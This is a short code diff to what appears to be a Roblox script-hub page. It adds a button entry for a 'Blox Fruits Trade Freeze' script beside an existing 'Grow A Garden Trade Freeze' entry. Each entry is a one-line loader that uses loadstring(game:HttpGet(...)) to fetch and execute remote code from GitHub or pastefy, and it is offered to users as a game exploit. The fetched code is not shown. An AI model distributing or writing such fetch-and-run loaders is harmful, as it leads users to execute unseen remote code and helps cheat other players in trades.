@@ -1,6 +1,10 @@
 // ---------- BUTTONS CONFIG ----------
 const scripts = [
     {
+        name: "Blox Fruits Trade Freeze",
+        code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/XXUltimateScriptsXX/BloxFruits/refs/heads/main/TradeFreeze"))()`
+    },
+	{
         name: "Grow A Garden Trade Freeze",
         code: `loadstring(game:HttpGet("https://pastefy.app/n0IQebNb/raw"))()`
     },
@@ -87,5 +91,6 @@ function updateBackground() {
     requestAnimationFrame(updateBackground);
 }
 updateBackground();
+
 
 
